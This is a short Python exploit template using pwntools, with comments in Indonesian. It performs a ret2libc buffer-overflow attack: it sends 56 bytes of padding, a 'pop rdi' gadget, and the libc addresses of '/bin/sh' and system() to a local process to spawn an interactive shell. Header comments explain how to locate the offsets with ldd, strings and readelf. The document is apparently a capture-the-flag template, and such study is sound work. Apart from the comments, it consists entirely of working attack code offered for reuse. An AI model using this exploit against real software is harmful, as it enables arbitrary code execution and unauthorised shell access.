#ldd <nama_file> output = hex_address
#strings -a -t x /lib/x86_64-linux-gnu/libc.so.6|grep /bin/sh 0x180519 
#readelf -s /lib/x86_64-linux-gnu/libc.so.6|grep system 0x0449c0
#pop_rdi 0x00000000004011cb

from pwn import *

p=process("")
print(p.recv())

padding = b'A'*56 #sesuaikan padding dengan file
pop_rdi =p64(0x4011cb) #sesuaikan
base_libc = 0x7ffff7dfa000 #sesuaikan
system = p64(base_libc+0x0449c0) #sesuaikan
binsh = p64(base_libc+0x180519) #sesuaikan

p.sendline(padding+pop_rdi+binsh+system)
print(p.clean())
p.interactive()
